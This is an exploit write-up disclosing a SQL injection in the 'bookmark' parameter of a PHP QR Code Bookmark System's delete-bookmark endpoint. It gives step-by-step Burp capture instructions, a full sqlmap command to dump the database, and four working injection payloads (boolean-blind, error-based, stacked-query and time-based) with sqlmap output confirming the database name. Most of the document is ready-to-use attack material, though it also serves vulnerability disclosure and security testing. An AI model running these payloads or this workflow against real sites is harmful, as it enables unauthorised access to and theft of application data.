# QR Code Bookmark System - SQL Injection
+ **Exploit Title:** QR Code Bookmark System - SQL Injection
+ **Date:** 2024-06-04
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://www.sourcecodester.com/php/17286/qr-code-bookmark-system-using-php-and-mysql-source-code.html
+ **Software Link:** https://www.sourcecodester.com/download-code?nid=17286&title=QR+Code+Bookmark+System+Using+PHP+and+MySQL+with+Source+Code
+ **Version:** 1.0
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number

## Description:
QR Code Bookmark System allows SQL Injection via the 'bookmark' parameter in "http://localhost/qr-code-bookmark/endpoint/delete-bookmark.php?bookmark=1". Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "http://localhost/qr-code-bookmark/"
+ Then click delete button.
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:
```
GET /qr-code-bookmark/endpoint/delete-bookmark.php?bookmark=1 HTTP/1.1
Host: localhost
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
```
+ Use sqlmap to exploit. In sqlmap, use 'bookmark' parameter to dump the database.
```
sqlmap -r r.txt -p bookmark --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
------
Parameter: bookmark (GET)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: bookmark=1' RLIKE (SELECT (CASE WHEN (9672=9672) THEN 1 ELSE 0x28 END))-- CCJi

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: bookmark=1' AND EXTRACTVALUE(4273,CONCAT(0x5c,0x7178707671,(SELECT (ELT(4273=4273,1))),0x716a626b71))-- poGU

    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: bookmark=1';SELECT SLEEP(5)#

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: bookmark=1' AND (SELECT 4432 FROM (SELECT(SLEEP(5)))oKhu)-- gmOs
---
[08:17:42] [INFO] testing MySQL
[08:17:42] [INFO] confirming MySQL
[08:17:42] [INFO] the back-end DBMS is MySQL
web application technology: Apache 2.4.58, PHP 8.2.12
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[08:17:42] [INFO] fetching current database
[08:17:42] [INFO] resumed: 'qr_bookmark_db'
current database: 'qr_bookmark_db'
```
+ current database: `qr_bookmark_db`

![Ekran görüntüsü 2024-04-14 180355](https://github.com/BurakSevben/CVEs/assets/117217689/ddbf51ec-0adc-4769-b2e1-26822d1715de)
